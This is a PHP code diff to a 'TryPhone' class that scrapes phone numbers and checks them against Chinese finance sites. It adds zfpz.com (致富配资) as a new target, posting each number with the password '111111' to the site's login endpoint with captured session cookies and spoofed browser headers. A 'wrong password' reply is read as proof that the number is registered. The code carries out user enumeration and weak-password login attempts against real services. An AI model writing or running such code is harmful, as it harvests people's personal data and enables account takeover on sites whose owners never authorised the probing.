@@ -30,6 +30,7 @@ class TryPhone
 	const CAT_SHUNFAPZ = "shunFaPZ";
 	const CAT_XIJINFA = "xiJinFa";
 	const CAT_XUANGUBAO = "xuanGuBao";
+	const CAT_ZHIFU = "zhiFu";
 	static $catDict = [
 		self::CAT_TAOGUBA => '淘股吧',
 		self::CAT_YIHAOPZ => '一号配资',
@@ -39,6 +40,7 @@ class TryPhone
 		self::CAT_SHUNFAPZ => '顺发配资',
 		self::CAT_XIJINFA => '析金法',
 		self::CAT_XUANGUBAO => '选股宝',
+		self::CAT_ZHIFU => '致富配资',
 	];
 
 	// 把每天抓取到的手机号存入数据库
@@ -138,6 +140,8 @@ class TryPhone
 			$link = 'http://www.xijinfa.com/auth/check-user?username=' . $params['username'];
 		} elseif ($cat == self::CAT_XUANGUBAO) {
 			$link = 'https://api.xuangubao.cn/api/account/mobile_login';
+		} elseif ($cat == self::CAT_ZHIFU) {
+			$link = 'https://zfpz.com/index.php?app=web&mod=member&ac=dologin';
 		} else {
 			$link = '';
 
@@ -163,6 +167,8 @@ class TryPhone
 			$cookie = 'UM_distinctid=16a0bfc0b98122-061fb37e4f9c1a-12306d51-fa000-16a0bfc0b9940a; device_token=eyJpdiI6InpWSnVDZDY3cUo5MjNqRml0Zm5KNXc9PSIsInZhbHVlIjoiVE8zSllGbTNna0FyK2owNTBTemhyK0NLTDRFRUxndlJKNzdLSWR4dlpMT0QwSk10S0pXTHA0am1zVHVyeWh1dGVnQWllK2JJSmloRVlhUUlKdVBWNUlMbElkRGVUZHl0a2tDM0tGN2x4XC9JPSIsIm1hYyI6IjgzM2VhOWMwNjE0MGRiNmNlZjU3MmMxNGNjOGFiNzk2ZmNlMzRlNThlMzc2MWQ5YjQwMmQwNTFjZTAzYjE2OTUifQ%3D%3D; CNZZDATA1260384432=740519197-1554975728-%7C1555256194; XSRF-TOKEN=eyJpdiI6ImxHbGg4UjE2NDlRVGRhZ29cLzZ0Rml3PT0iLCJ2YWx1ZSI6Ims4Y0FkeEgxRHVzTWp0eTA3UzhWeERxRWZPOFdEaGxZVUl1aTJcL2x0eVFPSjZCeVBTNlNxU1RhdE8xaTNYMERYSkVHZ3ZnUUtxRGgxUXV6WVBxTXlCQT09IiwibWFjIjoiMDVjYmQ2ZWEwYTRkYmQxNmU1MmNjM2Q2MGIyYjEyZjBhYWUzMzE5MGU2NjUzMDlhMzQ2YTE0ODE3YTVjMDE2YiJ9; laravel_session=eyJpdiI6Ijg4Yk1VaXdBMXJCdytscVN6MWI2WHc9PSIsInZhbHVlIjoiZFRBelwvTmRSY1k5aG5vc21uWjJ2bXVhaThmd0kyM09NMDhXeVlQcDJiUTlqdkhpdlZjMnVUeENFUHY2YVwvOFVJTW9FVEpKK21mYldjdDZzVGtGY0lSdz09IiwibWFjIjoiY2JlMjk4ZTQxZTMxMmEzNjI5YjcyMGUzMzIyMzFhYWUzMDcwNGRhZmMwMzczNDA2Yzg5MTUwNDdjNDcwMzIyZSJ9';
 		} elseif ($cat == self::CAT_XUANGUBAO) {
 			$cookie = '';
+		} elseif ($cat == self::CAT_ZHIFU) {
+			$cookie = '__jsluid=25b66427ec95de684c0e99b438db457b; PHPSESSID=shh8fj6lcckv6s8cbvv0dneh62; __jsl_clearance=1559216596.818|0|9N59315ca1XiTcVgYIpZ0mmaWTc%3D';
 		} else {
 			$cookie = '';
 
@@ -192,6 +198,30 @@ class TryPhone
 		}
 		$ret = "";
 		switch ($cat) {
+			case self::CAT_ZHIFU:
+				$data = [
+					'username' => (string)$phone,
+					'password' => '111111',
+					'authcode' => '',
+					'from' => '/index.php?app=web&mod=user&ac=account',
+				];
+				$header = [
+					'Accept:application/json, text/javascript, */*; q=0.01',
+					'Accept-Encoding: gzip, deflate, br',
+					'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8',
+					'Connection: keep-alive',
+					'Content-Length: 105',
+					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+					'Host: zfpz.com',
+					'Origin: https://zfpz.com',
+					'Referer: https://zfpz.com/index.php?app=web&mod=member&ac=login',
+					'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
+					'X-Requested-With: XMLHttpRequest',
+				];
+				$ret = self::reqData($data, $cat, $header, 0, 'gzip');
+				var_dump($ret);
+
+				break;
 			case self::CAT_XUANGUBAO:
 				$data = [
 					'Mobile' => (string)$phone,
@@ -207,7 +237,7 @@ class TryPhone
 					'X-Track-Info: {"AppId":"com.xuangubao.web","AppVersion":"1.0.0"}',
 				];
 				$ret = self::reqData($data, $cat, $header, 0, 'gzip', 'Request-Payload');
-				var_dump($ret);
+
 				break;
 			case self::CAT_XIJINFA:
 				$data = [
@@ -676,6 +706,10 @@ class TryPhone
 			case self::CAT_XIJINFA:
 				$field = "errMsg";
 				$tip = "用户名已存在";
+				break;
+			case self::CAT_ZHIFU:
+				$field = "msg";
+				$tip = "密码错误";
 				break;
 		}
 
